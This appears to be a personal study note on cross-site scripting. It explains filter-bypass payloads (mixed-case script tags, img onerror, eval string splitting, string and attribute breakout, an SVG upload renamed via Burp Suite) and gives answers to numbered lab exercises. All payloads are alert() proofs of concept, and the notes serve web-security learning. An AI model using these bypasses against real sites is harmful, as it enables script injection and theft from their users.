# XSS

Cross-site scripting is a type of security vulnerability that can be found in some web applications. XSS attacks enable attackers to 
inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access 
controls such as the same-origin policy

[Type OF XSS](#type-of-xss)

[Resource](#resource)

[Note](#note)

[LAB](#LAB)

## Type OF XSS

1. Stored XSS 
2. Reflected XSS 
3. DOM-based XSS
4. XSS Discovery and Prevention

## Resource 

    https://cheatsheetseries.owasp.org/
    https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
    

## Note 

Check source code and add paylods check which type of error and block word and bypass

1. Open source code and enter paylods in urls like <script>alert(1)</script> script reflecte like

    alert(1)!</p>
       
So script word is block so modify script word and try bypass use this paylods 

    <sCript>alert(1)</sCRIpt> 
    
This paylods enter the urls and check source code  

     <sCript>alert(1)</sCRIpt>!</p>
     
This is Vulnerablity

2. Open source code and enter paylods in urls like <script>alert(1)</script> script so error message script is complect block use HTML code like

        <img src='zzzz' onerror='alert(1)' />
        
3. Open source code and enter paylods in urls like <script>alert(1)</script> script so error try onlyfor script bedaut alert(1) <script></script> check source code like 

       <script></script>!</p>
       
So alert word is block try modify alert and try to bypass

    <script>eval("al"%2b"ert(1)")</script>

4. Open source code and enter paylods in urls like <script>alert(1)</script> script reflected in source code like 

       <script>
              var $a= "<script>alert(1)</script>";
        </script>
       
     
 Pylods in JavaScript code bypass using // or by adding some dummy code (var $dummy = ") to close it correctly.

     </script><script>alert(1)</script> 
     
Use This paylods and check the source code 

     <script>
       var $a= " </script><script>alert(1)</script>";
     </script>
                 
Boom bypass simple use dummy code 

5. Open source code and enter paylods in urls like <script>alert(1)</script> script reflected in source code like 

       <script>
         var $a= ' &lt;script&gt;alert(1)&lt;/script&gt;';
       </script>

See Here < slace is encode so try to single slace ' dublee " ; which is not encoded 

Try < like hacker< and check source code 

     'hacker&lt;'; 
     
Look < back slace is encode and try duble code "

     'hacker&quot;';
     
Double code is encoded so try single code '

      'hacker'';
     
Single code is not encoded boom bypass the security
     
Use the paylods like

     ';alert(1);'


6. You have a search funtion and search like asif so asif is reflected, search any thinkgs like asif you redirect urls in /index.php so try to here paylods like urls

       https://example.com/index.php
     
First Thinks and sameculen and use random word like asif so asif is reflected here is vulnerblity like 

     <form action="/index.php/asif" method="POST">
     
Here tyr to paylods and bypass f>     

Step 1. use simple paylods like <script>alert(1)</script> 

Input urls

      https://example.com//index.php/asif<script>alert</script> 

Output Source Code 

      <form action="/index.php/asif<script>alert</script>" method="POST">
      
Here Paylods Not executed bucause " colume is proble so try solve " colume sime use asif" like 

Input 
 
      https://example.com//index.php/asif"<script>alert</script> 
      
Output

      <form action="/index.php/asif"<script>alert</script>" method="POST">

Here Paylods Not executed bucause alert is not executed so try extra <> backslac

Input 

      https://example.com//index.php/asif"><script>alert(1)</script>< 

Output

      <form action="/index.php/asif"><script>alert(1)</script><" method="POST">

Boom Paylods is executed

7. You have a pic upload funtion so create a file exploit.svg like

       <?xml version="1.0" standalone="no"?>
       <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
       <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
       <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
       <script type="text/javascript">
       alert("xss");
       </script>
       </svg>

Uploda a file so server is error message show because .svg extention is not allow so use bur-suite and change exploit.svg extention and wrrite .png and sand server and boom server is accept a paylods and create a pop       
       
       
       
       
       
       
       
       
       

# LAB

## XSS 01

This exercise is simpel Cross-Site Scripting challange

    <script>alert(1)</script>

## XSS 02

    <sCript>alert(1)</sCRIpt> 
    
## XSS 03

Script is block so use the paylods

    <scr<script>ipt>alert(1)</scr</script>ipt>


## XSS 04

completely block the word script 

    <img src='zzzz' onerror='alert(1)' />

## XSS 05 

block alert word so modify and bypass

    <script>eval("al"%2b"ert(1)")</script>

## XSS 06

Here, reflect var $a= "asifkhan"; so bracke the "" 

    </script><script>alert(1)</script>

## XSS 07

Reflect 'asifkha' single coten so breck the single ''

    ';alert(1);'


## XSS 08

Redirect Urls 

    /index.php/asif"><script>alert(1)</script>< 


## XSS 10

Find Cookies in use xss 

## XSS SVG     

1. You have pic upload funtion 
2. Create a file like exploit.svg like 

       <?xml version="1.0" standalone="no"?>
       <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
       <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
       <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
       <script type="text/javascript">
       alert("xss");
       </script>
       </svg>       

3. Server is error svg file not accept use burp suite and change the extention 










